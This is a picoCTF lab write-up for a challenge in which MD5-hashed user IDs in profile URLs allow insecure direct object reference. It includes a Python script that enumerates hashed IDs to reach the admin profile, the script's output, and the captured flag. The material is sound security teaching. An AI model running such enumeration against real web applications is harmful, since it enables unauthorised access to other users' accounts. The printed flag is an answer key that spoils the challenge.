# CTF Writeup: Accessing the Admin Profile

## Challenge Description
> You have gotten access to an organisation's portal. Submit your email and password, and it redirects you to your profile. But be careful: just because access to the admin isn’t directly exposed doesn’t mean it’s secure. Maybe someone forgot that obscurity isn’t security... Can you find your way into the admin’s profile for this organisation and capture the flag?
> Hint: Notice anything about how the ID is being checked? It’s not plain text… maybe a one-way function is involved. There are about 20 employees in this organisation.
> IP: `http://crystal-peak.picoctf.net:54151/`

## Methodology

### Step 1: Initial Investigation
Visiting the provided IP address presented a login page. Inspecting the HTML source code revealed the credentials left in a comment:
```html
  <!-- Email: guest@picoctf.org Password: guest -->
```

### Step 2: Logging In
Submitting these credentials successfully authenticated the user and redirected the browser to a profile page. The URL of the profile page looked like this:
```
http://crystal-peak.picoctf.net:54151/profile/user/e93028bdc1aacdfb3687181f2031765d
```

### Step 3: Analyzing the URL
The ID `e93028bdc1aacdfb3687181f2031765d` in the URL appears to be a 32-character hexadecimal string, which is characteristic of an MD5 hash. Based on the hint ("maybe a one-way function is involved"), this confirms that the user ID is hashed.

To determine the original plain text value, we cracked the MD5 hash `e93028bdc1aacdfb3687181f2031765d` and found that it corresponds to the number `3000`. This means the guest user's ID is `3000`.

### Step 4: Iterating to Find the Admin
The hint states that there are "about 20 employees in this organisation." Since our user ID is `3000`, the other employees (including the admin) are likely nearby, probably starting from `3000` or ending around `3020`.

We can write a script to calculate the MD5 hash of integers around `3000` and attempt to access their corresponding profile pages.

```python
import urllib.request
import hashlib

for i in range(2980, 3020):
    h = hashlib.md5(str(i).encode()).hexdigest()
    url = f'http://crystal-peak.picoctf.net:54151/profile/user/{h}'
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req) as response:
            html = response.read().decode()
            if 'picoCTF' in html:
                print(f'Found flag on ID {i}: {h}')
                print(html)
    except Exception as e:
        pass
```

### Step 5: Capturing the Flag
Running the script quickly found the flag at ID `3012`. The script output was:
```
Found flag on ID 3012: 5a01f0597ac4bdf35c24846734ee9a76
Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_090019fc}
```

By hashing the ID `3012` using MD5 (`5a01f0597ac4bdf35c24846734ee9a76`) and visiting the URL directly, we were successfully authenticated as the admin and retrieved the flag.

## Flag
`picoCTF{id0r_unl0ck_090019fc}`
